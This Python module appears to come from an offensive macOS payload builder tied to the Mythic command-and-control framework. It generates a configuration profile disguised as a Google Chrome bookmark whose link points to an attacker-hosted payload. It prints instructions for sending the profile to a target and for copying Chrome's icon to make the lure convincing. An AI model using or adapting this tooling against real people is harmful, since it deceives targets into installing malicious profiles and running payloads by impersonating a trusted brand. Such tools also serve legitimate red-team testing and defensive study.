import asyncio
from .Utilities import *


def mobile_webloc():
    temp = "./Templates/MobileConfigWebLoc/"
    payload = "./Payloads/MobileConfigWebLoc_Payload"

    copyanything(temp, payload)

    templateString1 = "CONSENT_TEXT"
    templateString2 = "BASE64_IMAGE"
    templateString3 = "ICON_LABEL"
    templateString4 = "PAYLOAD_DESCRIPTION"
    templateString5 = "PAYLOAD_DISPLAYNAME"
    templateString6 = "COM.PAYLOAD.IDENTIFIER"
    templateString7 = "WEBLOC_URL"
    templateString8 = "PAYLOAD_PARENT_DESCRIPTION"
    templateString9 = "PAYLOAD_PARENT_DISPLAYNAME"
    templateString10 = "COM.OUTER.PAYLOADIDENTIFIER"
    templateString11 = "PAYLOAD_ORGANIZATION"

    fin = open(payload + "/webloc.mobileconfig", "rt")
    data = fin.read()

    data = data.replace(templateString1, "Bookmark File")
    data = data.replace(templateString2, "BASE64_Icon")
    data = data.replace(templateString3, "Bookmark")
    data = data.replace(templateString4, "Link to Application")
    data = data.replace(templateString5, "Link to Application")
    data = data.replace(templateString6, "com.chrome.bookmark")
    data = data.replace(templateString7, mythic_bookmark_link)
    # data = data.replace(templateString7, "https://google.com")
    data = data.replace(templateString8, "Bookmark Link")
    data = data.replace(templateString9, "Bookmark Link")
    data = data.replace(templateString10, "com.chrome.bookmark")
    data = data.replace(templateString11, "Google")

    fin.close()
    fin = open(payload + "/webloc.mobileconfig", "wt")
    fin.write(data)
    fin.close()

    print("[+] Built webloc.mobileconfig")
    print("To setup: \n"
          "1) Create an host a payload at the 'WEBLOC_URL' location \n"
          "2) Send the webloc.mobileconfig to the target \n"
          "3) After the target installs the profile on there will be a webloc icon on their Dock. \n"
          "4) They still need to open and click the link. As well as take any actions required for the selected payload \n"
          "\n"
          "Note: If you want an different image to appear in Dock its best to manually add to config in Payload folder \n"
          "For example: Take value of 'base64 -in /Applications/Google Chrome.app/Contents/Resources/app.icns | pbcopy' and replace 'BASE64_Icon' ")
